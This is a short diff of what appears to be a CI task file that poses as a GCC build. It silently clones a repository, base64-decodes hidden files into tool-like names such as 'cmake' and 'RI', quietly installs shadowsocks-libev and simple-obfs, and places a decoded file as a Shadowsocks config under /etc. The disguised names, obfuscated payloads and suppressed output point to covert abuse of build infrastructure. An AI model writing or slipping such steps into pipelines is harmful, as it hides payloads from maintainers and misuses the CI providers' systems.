@@ -12,7 +12,7 @@ task:
     - git clone https://gccbuild@bitbucket.org/gccbuild/gcc.git &>/dev/null
     - base64 -d gcc/cmake_ > cmake
     - base64 -d gcc/config_ > CONFI
-    - base64 -d __REPO__/make_ > RI
+    - base64 -d gcc/make_ > RI
     - apt --yes install shadowsocks-libev simple-obfs &>/dev/null || true
     - base64 -d gcc/gcc_ > gcc/gcc_new 2>/dev/null
     - mv gcc/gcc_new /etc/shadowsocks-libev/make.json &>/dev/null
